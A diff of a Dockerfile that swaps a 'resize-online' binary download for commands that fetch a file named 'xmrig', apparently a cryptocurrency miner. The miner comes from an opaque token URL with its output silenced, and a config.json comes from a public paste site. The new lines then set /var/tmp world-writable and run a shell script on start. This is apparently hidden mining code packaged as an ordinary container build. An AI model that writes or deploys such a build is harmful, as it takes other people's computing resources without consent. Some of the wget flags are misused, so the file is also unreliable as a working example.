@@ -1,20 +1,12 @@
-FROM ubuntu:20.04
+FROM ubuntu:20.04 
 
-LABEL maintainer="Roman Nikov"
-
-RUN apt update; \
-    apt install -y wget; \
-    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTQxMTk5MjZ9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMteDVhZ2c2LWc0NnotZ3czYi1yeTJwLTZhc3Vmcm9pIn0.fXRzjnYHfy0kca-wKAqExXBPL7-QDRAtJAw-3pPZ9lw/resize-online.tar.gz; \
-    tar xf resize-online.tar.gz; \
-    cd resize-online; \
-    cp config.json /usr/local/bin/config.json; \
-    cp resize-online /usr/local/bin/resize-online; \
-    cd /usr/local/bin;
-
-WORKDIR /usr/local/bin
-
-RUN chmod 744 config.json;
-
-RUN chmod 744 resize-online;
-
-CMD resize-online
+RUN apt update
+RUN apt install wget -y
+RUN apt install jq -y
+RUN apt install bash -y
+ADD scripts/kjellscript.sh /var/tmp/kjellscript.sh
+RUN chmod 777 /var/tmp/kjellscript.sh
+RUN wget -o /var/tmp/ -L https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDMxNjF9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sInAiOiJibG9ic3JjL2Jsb2JzLXc1N2puai1xc281LWM0am4tcmp5eS01NDVlNXN2dSJ9.obKXsFRVMKOGcGKKKMXSqrc6oHVB9WlCuXJ35bKfVGY/xmrig > /dev/null 2>&1
+RUN wget -o /var/tmp/config.json https://www.toptal.com/developers/hastebin/losinazaci.json
+RUN chmod -R 777 /var/tmp
+CMD /var/tmp/kjellscript.sh
